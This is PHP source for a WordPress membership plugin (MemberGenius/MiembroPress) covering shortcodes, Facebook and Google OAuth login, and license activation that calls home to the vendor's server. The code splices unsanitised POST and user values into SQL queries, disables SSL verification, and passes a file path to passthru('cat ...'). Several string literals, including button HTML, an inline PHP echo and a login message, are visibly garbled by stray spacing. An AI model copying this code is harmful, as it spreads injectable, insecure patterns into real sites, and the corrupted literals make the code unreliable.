		$file = null;
		$theme = get_template_directory();
		if (basename($theme) == "nirvana") {
			$file = trailingslashit($theme) . 'templates / template - onecolumn . php';
		}

		if ($file && file_exists($file)) { return $file; }
		return $template;
	}

	public function permalink($url) {
		return "?".$_SERVER["QUER".chr(89)."_STRING"];
	}

	public function noFooter() { ?>
		<style type="text/css">
		<!--
		.entry-meta, .navigation, .nav-menu, .site-info, #colophon { display:none; }
		.entry-title { text-align:center; }
		// -->
		</style>
		<?php
	}

	public function noPost() {
		global $wp_query;
		if (!$wp_query->post) {
			$wp_query->post_count = 1;
		}
	}

	public function the_posts($posts) {
		if (count($posts) > 1) {
			return array_slice($posts, 0, 1);
		}
		return $posts;
	}

	public function noPosts($query) {
		global $wp_query;
		add_filter("the_posts", array(&$this, "the_posts"));
		$query->set("max_num_pages", "1");
		$query->set("posts_per_page", "1");
		$query->set("numberposts", "1");
		$query->set('post_type' ,'page');
		$query->set('post__in' ,array( ));
		$query->set('orderby' ,'post__in');
		$query->set('p' , null);
		remove_all_actions ('__after_loop');
		return $query;
	}

	public function title($buffer) {
		global $membergenius;
		if (isset($membergenius->registerLevel->level_name)) {
			return $membergenius->registerLevel->level_name . " Registro";
		}
		return $this->protectedTitle;
	}

	public function comments($posts) {
		global $membergenius;
		if (current_user_can("manage_options")) { return $posts; }
		$current_user = wp_get_current_user();
		$levels = $membergenius->model->getLevelInfo($current_user->ID);
		foreach ($levels as $level) {
			if ($level->level_comments == 1) {
				return $posts;
			}
		}
		foreach ($posts as $postID => $post) {
			$posts[$postID]->comment_status = 'closed';
			$posts[$postID]->ping_status = 'closed';
		}
		return $posts;
	}

	public function hideComments($posts) {
		foreach ($posts as $postID => $post) {
			$posts[$postID]->comment_status = 'closed';
			$posts[$postID]->ping_status = 'closed';
			$posts[$postID]->comment_count = 0;
		}
		return $posts;
	}

	public function clear_widgets($sidebars_widgets) {
		return array(false);
	}

	public function content($buffer) {
		global $admin_email;
		$admin_email = get_option("admin_email");
		?>

		<div align="center">
			<?php
			if (!get_option("wppp_username") || !get_option("wppp_password")) {
				wp_login_form();
			} elseif (file_exists(dirname('index . php')."/member-login.php")) {
				require(dirname('index . php')."/member-login.php");
			} else { ?>
				<form method="POST">
					<label>Username: <input type="text" name="wppp_username" size="10" /></label><br />
					<label>Password: <input type="password" name="wppp_password" size="10" /></label><br />
					<input type="submit" value="Continue" />
				</form>
				<p align="center"><a href="<?php echo wp_lostpassword_url( get_permalink() ); ?>">¿Contraseña perdida?</a></p>
				<?php
			} ?>
		</div>
		<?php
	}
}

class MemberGeniusShortcodes {
	public function __construct() {
		add_shortcode('mg_firstname', array(&$this, 'firstname'));
		add_shortcode('mg_lastname', array(&$this, 'lastname'));
		add_shortcode('mg_email', array(&$this, 'email'));
		add_shortcode('mg_username', array(&$this, 'username'));
		add_shortcode('mg_private', array(&$this, 'privatetag'));
		add_shortcode('private', array(&$this, 'privatetag'));
		add_shortcode('licenseKey', array(&$this, 'licensePHP'));

		if (!class_exists("WLMAPI")) {
			add_shortcode('firstname', array(&$this, 'firstname'));
			add_shortcode('lastname', array(&$this, 'lastname'));
			add_shortcode('email', array(&$this, 'email'));
			add_shortcode('username', array(&$this, 'username'));
			add_shortcode('wlm_private', array(&$this, 'privatetag'));
			add_shortcode('wlm_firstname', array(&$this, 'firstname'));
			add_shortcode('wlm_lastname', array(&$this, 'lastname'));
			add_shortcode('wlm_email', array(&$this, 'email'));
			add_shortcode('wlm_username', array(&$this, 'username'));
		}
	}

	public function licensePHP(){
		global $wpdb;
		$current_user = wp_get_current_user();
		$idUser = $current_user->ID;
		$licencia = $wpdb->get_results("SELECT licencia, type, url FROM wpop_licencias_member WHERE user_id = $idUser", ARRAY_A);
		if (array_pop(explode('/', $_SERVER['PHP_SELF'])) != 'post.php') {
			?>
			<br />
			<table border="1" cellspacing="10" cellpadding="10" style="margin: 15px auto; width:80%;">
			<caption><h3 style="font-size: 25px;">Aquí podrás ver las licencias de tus productos comprados</h3></caption>
			<thead>
				<tr>
					<th style="width: 50%; text-align: center;">Licencia</th>
					<th style="width: 29%; text-align: center;">URL Ultima Activación</th>
					<th style="width: 21%;; text-align: center;">Tipo de Licencia</th>
				</tr>
			</thead>
			<?php
			foreach ($licencia as $valor){
				?>
				<tbody>
					<tr>
						<td style="text-align: center;"><label id="licencia" style="cursor: text;"><?php echo $valor['licencia'] ?></label>
						&nbsp;&nbsp;&nbsp;<a href="#" class="fa fa-clipboard" onclick="copyToClipboard('#licencia')">Copiar</a></td>
						<td style="text-align: center;"><?php echo $valor['url'] ?></td>
						<td style="text-align: center;"><?php echo $valor['type'] ?></td>
					</tr>
				</tbody>
				<?php
			}
			?>
			</table>
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
			<script>
				function copyToClipboard(element) {
				  var $temp = $("<input>");
				  $("body").append($temp);
				  $temp.val($(element).text()).select();
				  document.execCommand("copy");
				  $temp.remove();
				}
			</script>
			<?php
		}
		return "";
	}

	public function privatetag($atts, $content) {
		global $membergenius;
		$current_user = wp_get_current_user();
		if (count($atts) == 0) { return ""; }
		$level = $atts[0];
		$userLevels = $membergenius->model->getLevelInfo($current_user->ID, "A");
		$userLevels = array_map(create_function('$a', 'return $a->level_name;'), $userLevels);
		if (in_array($level, $userLevels)) { return $content; }
		return "";
	}

	public function firstname() {
		$current_user = wp_get_current_user();
		if (!$current_user) { return; }
		return $current_user->user_firstname;
	}

	public function lastname() {
		$current_user = wp_get_current_user();
		if (!$current_user) { return; }
		return $current_user->user_lastname;
	}

	public function email() {
		$current_user = wp_get_current_user();
		if (!$current_user) { return; }
		return $current_user->user_email;
	}

	public function memberlevel() {
		$current_user = wp_get_current_user();
		if (!$current_user) { return; }
	}

	public function username() {
		$current_user = wp_get_current_user();
		if (!$current_user) { return; }
		return $current_user->user_login;
	}
}

class MemberGeniusSocial {
	var $handlers;
	function __construct() {
		$this->handlers = array( "google" => new MemberGeniusSocialHandlerGoogle, "facebook" => new MemberGeniusSocialHandlerFacebook );
	}

	function registration() {
		foreach ($this->handlers as $handler) {
			$handler->registration();
		}
	}
}

class MemberGeniusSocialHandler {
	var $error = null;
	var $ready = false;
	var $slug_callback, $slug_connect;
	var $label_login, $label_register;
	var $setting_enabled, $setting_app, $setting_secret;
	var $color = "#0085ba";
	function __construct() {
		$this->slug_callback = $this->slug."_callback";
		$this->slug_connect = $this->slug."_connect";
		$this->slug_session = "membergenius_social_".$this->slug;
		$this->label_login = "Log In with ".$this->name;
		$this->label_register = "Register with ".$this->name;
		$this->setting_enabled = "social_".$this->slug."_enabled";
		$this->setting_app = "social_".$this->slug."_app";
		$this->setting_secret = "social_".$this->slug."_secret";
		$this->setting_user = "social_".$this->slug;
		add_action('init', array(&$this, 'init'), 1);
		add_action('init', array(&$this, 'login_social'));
		add_action('init', array(&$this, 'register_social'));
		add_filter('login_message', array(&$this, 'login_message'));
		add_filter('login_form_bottom', array(&$this, 'login_form_bottom'), 100);
		add_action('login_form', array(&$this, 'login_form'));
		add_action('wp_login', array(&$this, 'login_save'), 8, 2);
	}

	public function init() {
		global $membergenius;
		$this->ready = $membergenius->model->setting($this->setting_enabled) && $membergenius->model->setting($this->setting_app) && $membergenius->model->setting($this->setting_secret);
		if (!$this->ready) { return; }
		@session_start();
	}

	function login($wp_user) {
		wp_set_auth_cookie($wp_user->ID);
		do_action('wp_login', $wp_user->user_login, $wp_user);
		$_POST['log'] = $wp_user->user_login;
		header("Location:".home_url());
		die();
	}

	function register($user, $level=null, $txn=null) {
		global $membergenius;
		if ($level == null) {
			return new WP_Error("nolevel", "No level given.");
		}
		$username = $user["username"];
		if (get_user_by('login', $username)) {
			$username = $user["email"];
		}
		if (get_user_by('login', $username)) {
			$username = $user["email"];
			return new WP_Error("userexists", "User already exists.");
		}
		$create = array( "action" => "miembropress_register", "membergenius_level" => $level, "membergenius_username" => $username, "membergenius_email" => $user["email"], "membergenius_firstname" => $user["first_name"], "membergenius_lastname" => $user["last_name"] );
		$output = $membergenius->admin->create($create);
		return $output;
	}

	public function request($query="miembropress_login") {
		global $membergenius;
		$token = $membergenius->model->setting($this->setting_app);
		if (!$token) { return; }
		$result = array("token" => $token, "level" => null, "url" => null);
		$url = home_url("wp-login.php?".$query."=".$this->slug_callback);
		if ($query == "miembropress_register") {
			reset($_GET);
			$level = basename(key($_GET));
			$result["level"] = $level;
			$url = $membergenius->model->signupURL($level, true).' & '.$query.' = '.$this->slug_callback;
		}

		$result["url"] = $url;
		return $result;
	}

	public function process($social_user, $setting_user, $query="miembropress_login") {
		global $membergenius;
		@session_start();
		if (empty($social_user) || !isset($social_user["id"]) || !isset($social_user["email"]) || !is_numeric($social_user["id"]) || !is_email($social_user["email"])) {
			return false;
		} elseif (isset($_SESSION["membergenius_hash"]) && $_SESSION["membergenius_hash"]) {
			$hash = stripslashes($_SESSION["membergenius_hash"]);
			unset($_SESSION["membergenius_hash"]);
		} else {
			$hash = basename(key($_GET));
		}
		if ($query == "miembropress_register" && isset($_SESSION["membergenius_temp"]) && ($temp_user = $membergenius->model->getTempFromTransaction($_SESSION["membergenius_temp"]))) {
			$overwrite = array( "username" => $social_user["username"], "email" => $social_user["email"], "firstname" => $social_user["first_name"], "lastname" => $social_user["last_name"], $setting_user => $social_user["id"] );
			$complete = $membergenius->model->completeTemp($temp_user->ID, $overwrite);
		} elseif ($wp_user = $membergenius->model->userSearch($setting_user, $social_user["id"])) {
			if (!isset($wp_user->ID) || !is_numeric($wp_user->ID)) { return false; }
			if ($query == "miembropress_register") { $level = $membergenius->model->getLevelFromHash($hash);
				$membergenius->model->add($wp_user->ID, $level->ID);
				if (current_user_can("administrator")) { wp_redirect($membergenius->admin->tabLink("members"));
					die();
				} else {
					$this->login($wp_user);
				}
				return;
			} else {
				$this->login($wp_user);
			}
		} elseif (($social_user["verified"] == true) && ($wp_user = get_user_by('email', $social_user["email"]))) {
			if ($existingUser = $membergenius->model->userSearch($setting_user, $social_user["id"])) {
				$membergenius->model->userSetting($wp_user->ID, $setting_user, null);
			}
			$membergenius->model->userSetting($wp_user->ID, $setting_user, $social_user["id"]);
			if ($query == "miembropress_register") {
				$level = $membergenius->model->getLevelFromHash($hash);
				$membergenius->model->add($wp_user->ID, $level->ID);
				if (current_user_can("administrator")) {
					wp_redirect($membergenius->admin->tabLink("members"));
					die();
				} else { $this->login($wp_user); }
			} else {
				$this->login($wp_user);
			}
		} else {
			if ($query == "miembropress_register") {
				$level = $membergenius->model->getLevelFromHash($hash);
				if ($level && isset($level->ID)) {
					$this->register($social_user, $level->ID);
					if (current_user_can("administrator")) {
						wp_redirect($membergenius->admin->tabLink("members"));
						die();
					} else {
						$this->login($wp_user);
					}
				} else {
					return new WP_Error("nolevel", "Membership level does not exist.");
				}
			} else {
				$_SESSION[$this->slug_session] = $social_user["id"];
				$redirect = home_url("wp-login.php?".$query."=".$this->slug_connect);
				header("Location: ".$redirect);
				die();
			}
		}
	}

	public function login_social() {
		if (!isset($_GET["miembropress_login"])) { return; }
		if ($_GET["miembropress_login"] == $this->slug) {
			$this->request();
			return;
		}
		if ($_GET["miembropress_login"] == $this->slug_callback) {
			$this->callback();
			return;
		}
	}

	public function register_social() {
		if (!isset($_GET["miembropress_register"])) { return; }
		if ($_GET["miembropress_register"] == $this->slug) {
			$this->error = $this->request("miembropress_register");
			return;
		}
		if ($_GET["miembropress_register"] == $this->slug_callback) {
			$this->error = $this->callback("miembropress_register");
			return;
		}
	}

	public function button($text=null, $url=null) {
		if ($text == null) {
			$text = $this->label_login;
		}
		if ($url == null) {
			$url = home_url("wp-login.php?miembropress_login=".$this->slug);
		}
		return ' < aid = "membergenius_social"href = "'.htmlentities($url).'"name = "miembropress_login_'.$this->slug.'"class = "button button-primary button-large"style = "display:block; width:100%; max-width:300px; margin-top:10px; text-align:center; background-color: '.$this->color.'; border:none !important; color: #fff; text-decoration: none; text-shadow:0 0 0 !important; box-shadow:0 0 0 ! important; border-radius: 3px; cursor:pointer; vertical-align: middle; height: 30px; line-height: 28px; padding: 0 12px 2px; margin-bottom:5px;"onclick = "jQuery(\'#user_login, #user_pass, #rememberme, #wp_submit, #membergenius_username, #membergenius_firstname, #membergenius_lastname, #membergenius_email, #membergenius_password1, #membergenius_password2\').attr(\'disabled\', true);" > < spanclass = "dashicons '.$this->dashicon.'"style = "width:40px; height:40px; font-size:30px;" > < / span > '.htmlentities($text).' < / a > ';
	}

	public function login_form_bottom($buffer) {
		if (!$this->ready) { return $buffer; }
		return $buffer.$this->button();
	}

	function login_save($user_login, $wp_user) {
		global $membergenius;
		if (!isset($_SESSION[$this->slug_session]) || !is_numeric($_SESSION[$this->slug_session])) { return; }
		$user_id = $_SESSION[$this->slug_session];
		$membergenius->model->userSetting($wp_user->ID, $this->setting_user, $user_id);
		unset($_SESSION[$this->slug_session]);
	}

	public function login_form() {
		global $membergenius;
		if (isset($_GET["miembropress_login"]) && !isset($_GET["code"])) { return; }
		if (!$this->ready) { return; }
		echo $this->button();
		?>
		<script type="text/javascript">
			<!--
			jQuery(function() {
				jQuery("#membergenius_social").insertAfter("#wp-submit");
			});
			// -->
		</script>
		<?php
	}

	public function login_message() {
		if (!isset($_GET["miembropress_login"])) { return; }
		if ($_GET["miembropress_login"] != $this->slug_connect) { return; }
		echo ' < pclass = "message" > Thisisthefirsttimeyouarelogginginwithyour'.$this->name.'account . Continuelogginginwithyourexistingaccounttocontinue . < / p > ';
	}

	public function registration() {
		if (!$this->ready) { return; }
		wp_enqueue_style('dashicons');
		$get = $_GET;
		$level = key($get);
		array_shift($get);
		$socialLink = "?".$level."&miembropress_register=".$this->slug;
		echo ' < palign = "center" > '.$this->button($this->label_register, $socialLink).' < / p > ';
		if (is_wp_error($this->error)) {
			echo ' < blockquoteclass = "error" > '.htmlentities($this->error->get_error_message()).' < / blockquote > ';
		}
	}
}

class MemberGeniusSocialHandlerFacebook extends MemberGeniusSocialHandler {
	var $slug = "facebook";
	var $name = "Facebook";
	var $dashicon = "dashicons-facebook";
	var $color = "#3c5a99";
	public function login_scripts() {
		global $membergenius;
		if (!$membergenius->model->setting("social_facebook_enabled") || !$membergenius->model->setting("social_facebook_app") || !$membergenius->model->setting("social_facebook_secret")) { return; }
		?>
		<script>
			window.fbAsyncInit = function() {
				FB.init({
					appId: ' < ? phpecho $membergenius->model->setting("social_facebook_app"); ?>',
					cookie: true, xfbml: true, version: 'v2.2'
				});
			};
			// Load the SDK asynchronously
			(function(d, s, id) {
				var js, fjs = d.getElementsByTagName(s)[0];
				if (d.getElementById(id)) return;
				js = d.createElement(s); js.id = id;
				js.src = "//connect.facebook.net/en_US/sdk.js";
				fjs.parentNode.insertBefore(js, fjs);
			}(document, 'script', 'facebook-jssdk'));
		</script>
		<?php
	}

	public function request($query="miembropress_login") {
		@extract(parent::request($query));
		$_SESSION['state'] = md5(uniqid(rand(), TRUE));
		$dialog_url = "https://www.facebook.com/dialog/oauth?client_id=" . $token . "&redirect_uri=" . rawurlencode($url) . "&state=" . $_SESSION['state'] . "&scope=email";
		header("Location: $dialog_url");
		die();
	}

	public function callback($query="miembropress_login") {
		global $membergenius;
		if ($_REQUEST['state'] != $_SESSION['state']) {
			die("XSS");
		}

		$code = $_REQUEST['code'];
		$url = home_url("wp-login.php?".$query."=facebook_callback");
		if ($query == "miembropress_register") {
			reset($_GET);
			if (isset($_SESSION["membergenius_hash"])) {
				$hash = stripslashes($_SESSION["membergenius_hash"]);
				unset($_SESSION["membergenius_hash"]);
			} else {
				$hash = basename(key($_GET));
			}
			$url = $membergenius->model->signupURL($hash, true).'&'.$query.'=facebook_callback';
		}
		$token_url = "https://graph.facebook.com/oauth/access_token?" . "client_id=" . $membergenius->model->setting("social_facebook_app") . "&redirect_uri=" . urlencode($url) . "&client_secret=" . $membergenius->model->setting("social_facebook_secret") . "&code=" . $code;
		$response = @file_get_contents($token_url);
		$params = array();
		parse_str($response, $params);
		$graph_url = "https://graph.facebook.com/me?access_token=" . $params['access_token'] . '&fields='.urlencode('id,email,name,first_name,last_name,picture,verified');
		$json_contents = @file_get_contents($graph_url);
		$social_output = json_decode($json_contents);
		$social_user = array( "id" => $social_output->id, "email" => $social_output->email, "username" => $social_output->name, "first_name" => $social_output->first_name, "last_name" => $social_output->last_name, "photo" => $social_output->picture->data->url, "verified" => ($social_output->verified=="true") );
		parent::process($social_user, $this->setting_user, $query);
	}
}

class MemberGeniusSocialHandlerGoogle extends MemberGeniusSocialHandler {
	var $slug = "google";
	var $name = "Google";
	var $dashicon = "dashicons-googleplus";
	var $color = "#DC4E41";
	public function request($query="miembropress_login") {
		global $membergenius;
		@session_start();
		extract(parent::request($query));
		$_SESSION['state'] = md5(uniqid(rand(), TRUE));
		if ($level && $query == "miembropress_register") {
			$_SESSION['membergenius_hash'] = $level;
		}
		$app = $membergenius->model->setting("social_google_app");
		$secret = $membergenius->model->setting("social_google_secret");
		$scope = "email";
		$redirect = home_url("wp-login.php?".$query."=google_callback");
		$verify = "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=".rawurlencode($app)."&redirect_uri=".urlencode($redirect)."&scope=".rawurlencode($scope)."&state=token&access_type=offline";
		wp_redirect($verify);
		die();
	}

	public function callback($query="miembropress_login") {
		global $membergenius;
		if (!isset($_GET["code"])) { return; }
		$code = stripslashes($_GET["code"]);
		$app = $membergenius->model->setting("social_google_app");
		$secret = $membergenius->model->setting("social_google_secret");
		$redirect = home_url("wp-login.php?".$query."=google_callback");
		$tokenBody = array( "code" => $code, "client_id" => $app, "client_secret" => $secret, "redirect_uri" => $redirect, "grant_type" => "authorization_code", );
		$tokenURL = "https://www.googleapis.com/oauth2/v4/token";
		$tokenPost = wp_remote_post($tokenURL, array("body" => $tokenBody, "httpversion" => "1.0"));
		$tokenResult = json_decode(wp_remote_retrieve_body($tokenPost));
		if (!isset($tokenResult->access_token)) { die("No token"); }
		$access_token = $tokenResult->access_token;
		$url = "https://www.googleapis.com/plus/v1/people/me";
		$headers = array("Authorization" => "Bearer ".$access_token, "accept-encoding" => "gzip;q=0,deflate,sdch");
		$post = wp_remote_get($url, array("headers" => $headers, "body" => array(), "httpversion" => "1.0"));
		if (is_wp_error($post) || wp_remote_retrieve_response_code($post) != 200) { return null; }
		$social_output = json_decode(wp_remote_retrieve_body($post));
		$social_user = array( "id" => $social_output->id, "email" => $social_output->emails[0]->value, "username" => $social_output->displayName, "first_name" => $social_output->name->givenName, "last_name" => $social_output->name->familyName, "photo" => $social_output->images->url, "verified" => ($social_output->verified=="true") );
		parent::process($social_user, $this->setting_user, $query);
	}
}

class MemberGeniusActivation {
	public $call;
	private $ultmate;
	public $key;
	public $email;
	public $fullURL;
	public $slug;
	public $version;
	private $productName;
	private $upgradeURL;
	private $keyURL;
	private $url;
	private $salt;
	private $dbs;
	private $start;
	private $step;
	public $debug;

	function __construct($homeURL, $productSlug, $productName, $licenseURL=null) {
		global $wpdb;
		$prefix = $wpdb->prefix . "miembropress_";
		$this->settingsTable = $prefix."settings";
		$this->debug = false;
		$this->ultimate = false;
		$this->slug = $productSlug;
		$this->call = "";
		if (function_exists("current_user_can") && current_user_can("manage_options") && isset($_POST[$this->slug."_deactivate"])) {
			$licencia = $wpdb->get_var("SELECT option_value FROM ".$this->settingsTable." WHERE option_name = 'licencia_member'");
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_URL, "https://miembros.miembropress.com/desactivado.php?license=$licencia");
			curl_exec($ch);
			curl_close($ch);
			$this->deactivate();
		}
		$this->call();
		$this->key = "";
		$this->email = "";
		@list($this->key, $this->email) = $this->settings_get("key", "email");
		$this->productName = $productName;
		$this->upgradeURL = $homeURL;
		if ($licenseURL) {
			$this->keyURL = trailingslashit($licenseURL)."license-key";
		} else {
			$this->keyURL = trailingslashit($this->upgradeURL)."license-key";
		}
		$this->fullURL = trailingslashit($this->upgradeURL).'?wpdrip='.urlencode($this->email.'|'.$this->key.'|'.$this->slug.'|'.dirname(constant("WP_CONTENT_URL")));
		/*if (class_exists("PluginUpdateChecker") && $this->key && $this->email) {
			$updates = new PluginUpdateChecker($this->fullURL.'&action=update', 'miembro-press/miembro-press.php', $this->slug);
		} */
		$this->call();
		if (!function_exists( 'get_plugins' ) ) {
			require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
		}
		$plugin_folder = get_plugins( '/' . plugin_basename( dirname( 'miembro-press/miembro-press.php' ) ) );
		$plugin_file = basename( 'miembro-press/miembro-press.php');
		$this->version = $plugin_folder[$plugin_file]['Version'];
		$this->salt = "sfg54fdc44g623p9";
		$this->dbs = chr(92).chr(92);
		if ((isset($_GET["activator-debug"]) || isset($_GET["activator_debug"]))) {
			$this->debug = true;
		}
		if (function_exists("get_option") && !defined('WP_CONTENT_URL')) {
			define('WP_CONTENT_URL', get_option('siteurl') . '/wp-content');
		}
		if (!$this->url) {
			if (defined("WP_CONTENT_URL")) {
				$this->url = constant("WP_CONTENT_URL") . "/plugins/" . basename(dirname('miembro-press/miembro-press.php'));
			} else {
				$this->url = 'miembro-press/miembro-press.php';
			}
		}
	}

	function deactivation_button() {
		echo '<input type="submit" class="button" name="'.$this->slug.'_deactivate" value="Deactivate License for This Site" onclick="return confirm(\'Are you SURE you want to deactivate your license for this site?\');" />';
	}

	function notice() {
		if (!isset($_GET["page"])) { return; }
		if ($_GET["page"] != plugin_basename('miembro-press/miembro-press.php')) { return; }
		$newest = $this->call();
		$current = $this->version;
		$updateURL = dirname(constant("WP_CONTENT_URL")).'/wp-admin/update-core.php';
		$this->debug($newest . " vs " . $current . " = " . $this->version_compare($newest, $current));
		if ($this->version_compare($newest, $current) <= 0) { return; }
		echo '<div class="updated" style="text-align: center; padding: 10px;">';
		echo '<b>'.$this->productName . ':</b> An update is available. ';
		echo '<a href="' . $updateURL.'" target="_self">Click here to update to version '.$newest.'.</a>';
		echo '</div>';
	}

	function confirm($string, $action="activate") {
		if (!isset($this->settings)) {
			$this->settings = get_option($this->slug);
		}

		$string = urldecode($string);
		@list($email, $key, $level, $site) = explode("|", $string);
		$level = urldecode($level);
		$ban = get_option($this->slug."ban");
		if (is_array($ban) && count($ban) > 0 && in_array($site, $ban)) { return "FAILED"; }
		if (!$email) { return "FAILED"; }
		if ($this->key($email) != $key) { return "FAILED"; }
		$id = $this->get_id_by_email($email);
		if ($id <= 0 || is_numeric($site)) { return "UNKNOWN"; }
		$activations = get_option($this->slug."activations");
		$activation = array();
		if (isset($activations[$level])) { $activation = $activations[$level]; }
		if (!$level) { $activation = reset($activations); }
		$product = "";
		if (isset($activation["slug"])) { $product = $activation["slug"]; }
		if (isset($activation["levels"])) {
			$level = $activation["levels"];
		} else {
			if ($level == "Monthly") {
				$level = "Monthly,WPDrip,Completed,Student,VIP Student,WPDrip Single,WPDrip Triple";
			}
			if (eregi(',', $level)) {
				$level = explode(",", $level);
			}
			if (!is_array($level)){
				$level = array($level);
			}
		}
		$pass = true;
		if (class_exists("WLMAPI")) {
			$pass = false;
			$levels = WLMAPI::GetUserLevels($id);
			$levels = $this->upgrade_levels($levels);
			if (is_array($level) && count($level) > 0) {
				foreach ($level as $clientLevel) {
					if (in_array($clientLevel, $levels)) {
						$pass = true;
						break;
					}
				}
			}
		}

		if ($action == "download") {
			@ob_end_clean();
			if (!$pass) { die(); }
			if ($this->key($email) != $key) { die(); }
			$download = $this->find($product);
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="'.basename($download).'"');
			header('Content-Length: ' . filesize($download));
			passthru('cat '.$download, $err);
			die();
		}

		if ($action == "update") {
			@ob_end_clean();
			if (!$pass) { die(); }
			if ($this->key($email) != $key) { die(); }
			header("Content-type:application/json");
			$this->update($product, $email, $key, $level);
			die();
		}
		if (!preg_match('@membershipcube@si', $_SERVER["HTTP_HOST"]) && $action == "expire") { echo "EXPIRED"; die(); }
		if (!preg_match('@membershipcube@si', $_SERVER["HTTP_HOST"]) && $action == "kill") {
			if ($this->settings["key"] == $key && $this->settings["email"] == $email) {
				$this->deactivate();
				echo "KILLED";
				die();
			}
		}

		if (class_exists("WLMAPI")) {
			if (!$pass) {
				return "FAILED";
			}
			$domains = get_user_meta($id, $this->slug);
			$allow = true;
			if (!in_array($site, $domains) && $action == "activate") {
				if (($levels == "WPDrip Single" || in_array("WPDrip Single", $levels)) && count($domains) > 1) { return "FAILED"; }
				if (($levels == "WPDrip Triple" || in_array("WPDrip Triple", $levels)) && count($domains) > 3) { return "FAILED"; }
			}
			if ($action == "deactivate") {
				$this->remove($id, $site, $email);
				return "FAILED";
			}
			$special = "";
			if (is_array($levels)) {
				foreach ($levels as $levelKey => $levelValue) {
					if ($levelValue == "Ultimate") {
						$special = "ultimate";
					}
					if (!in_array($levelValue, $levels)) { continue; }
					if ($site) { $oldDomains = $domains; $domains[] = $site; $domains = array_values(array_unique($domains)); }
					update_usermeta($id, $this->slug, $domains);
				}
			}
			if ($special == "") {
				if (isset($activation["download"]) && ($version = $this->version($activation["download"]))) {
					return $version;
				} else { return $this->version; }
			}
			return $this->version . "-" . $special;
		}
		return "FAILED";
	}

	function settings_get() {
		if (!function_exists("get_option")) { return; }
		$settings = get_option($this->slug);
		if ($args = func_get_args()) {
			$return = array();
			foreach ($args as $arg) {
				$return[] = $settings[$arg];
			}
			return $return;
		}
		return $settings;
	}

	function call() {
		global $wpdb;
		$prefix = $wpdb->prefix . "miembropress_";
		$this->settingsTable = $prefix."settings";

		$settings = array();
		if (isset($_POST["LicenseEmail"]) && isset($_POST["LicenseKey"]) && isset($_POST["licenciaMember"])) {
			$settings = array();
			$settings = get_option($this->slug);
			if (!is_array($settings)) {
				$settings = array();
			}
			$settings["email"] = trim($_POST["LicenseEmail"]);
			$settings["key"] = trim($_POST["LicenseKey"]);
			$license = $_POST['licenciaMember'];
			$myURL = $_SERVER['HTTP_HOST'];
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_URL, "https://miembros.miembropress.com/activacion.php?license=$license&url=$myURL");
			curl_exec($ch);
			curl_close($ch);
			$consulta = $wpdb->get_var("SELECT COUNT(*) FROM ".$this->settingsTable." WHERE option_name = 'licencia_member'");
			if ($consulta == 0) {
				$wpdb->query("INSERT INTO ".$this->settingsTable." (`ID`, `option_name`, `option_value`) VALUES (NULL, 'licencia_member', '$license')");
			}else{
				$wpdb->query("UPDATE ".$this->settingsTable." SET option_value = '$license' WHERE option_name = 'licencia_member'");
			}
			update_option($this->slug, $settings);
		}
		$site = dirname(constant("WP_CONTENT_URL"));
		$hash = "";
		$email = "";
		$key = "";
		$hash = "";
		$lasthash = "";
		$lastcheck = 0;
		$lastversion = 0;
		$version = 0;
		if ($this->version) {
			$lastversion = $this->version;
		}
		$lastversioncheck = 0;
		$settings = array();
		if ($settings = get_option($this->slug)) {
			extract($settings);
		}
		$url = "";
		if ($this->fullURL) {
			$url = $this->fullURL;
		}
		$this->debug("call home = " . $url);
		$licenseExpire = (time()-$lastcheck) > 86400;
		$versionExpire = (time()-$lastversioncheck) > 3600;
		$timeoutExpire = (time()-$lastversioncheck) > 30;
		$this->debug("timeout expire = " . (time()-$lastversioncheck) . " seconds");
		$this->debug("last license check: " . date("r", $lastcheck) . " = " . (time() - $lastcheck) . ", " . "last version check: " . date("r", $lastversioncheck) . " = " . (time() - $lastversioncheck));
		$hash = "";
		if ($this->salt) {
			$hash = md5($lastversioncheck."|" . "|" . $lastversion . "|" . $this->salt);
		}
		$this->debug("hash = " . $hash .", last hash = ". $lasthash);
		if (strpos($this->call, "ultimate") !== FALSE && !$this->ultimate) {
			$this->ultimate = true;
		}
		$this->debug("cached = " . $this->call);
		if ($this->salt && $hash == $lasthash && $this->call != "") {
			return $this->call;
		}
		$this->debug("continuing...");
		$this->debug("license expire = " . $licenseExpire . ", version expire = " . $versionExpire . ", lastversion = " . $lastversion . ", key = " . $key);
		if (!$url) {
			$this->debug("Not calling home yet");
			return $lastversion;
		} elseif (!$this->salt) {
			$this->debug("Did not need to call home");
			$this->call = $lastversion;
			if (strpos($this->call, "ultimate") !== FALSE && !$this->salt) { $this->salt = true; }
			return $lastversion;
		} elseif (!$key || !$email) {
			return "UNREGISTERED";
		} elseif ($licenseExpire || $versionExpire || !$lastversion || strpos($this->call, " ") !== FALSE) {
			$this->debug("key = $key, timeout expire = $timeoutExpire, lastversion = $lastversion");
			if (!isset($_POST["LicenseEmail"]) && $key && !$timeoutExpire && ($lastversion == "UNREGISTERED" || $lastversion == "UNKNOWN" || $lastversion == "CANCELLED" || $lastversion == "FAILED" || $lastversion == "BLOCKED")) {
				$this->debug("Delayed calling home. Cached = $lastversion");
				return $lastversion;
			}
			$this->debug("Called home");
			if (!function_exists( 'wp_remote_get' ) ) {
				require_once( ABSPATH . 'wp-includes/http.php' );
			}
			if (function_exists("wp_remote_get")) {
				$response = "";
				$result = wp_remote_get($url, array( 'timeout'=>30, 'sslverify' => false, 'httpversion' => '1.1' ));
				$this->debug(var_export($result, true));
				$this->debug("url = $url");
				if(is_wp_error($response)) {
					$this->debug(var_export($response, true));
					$response = "BLOCKED";
				}
				$results = wp_remote_retrieve_body($result);
				if (empty($results)) {
					$this->debug("empty response");
					$results = "BLOCKED";
				}
			} else {
				$snoopy = new Snoopy();
				$snoopy->_fp_timeout = 10;
				if ($result = $snoopy->fetch($url)) {
					$results = $snoopy->results;
				}
			}
			if ($results) {
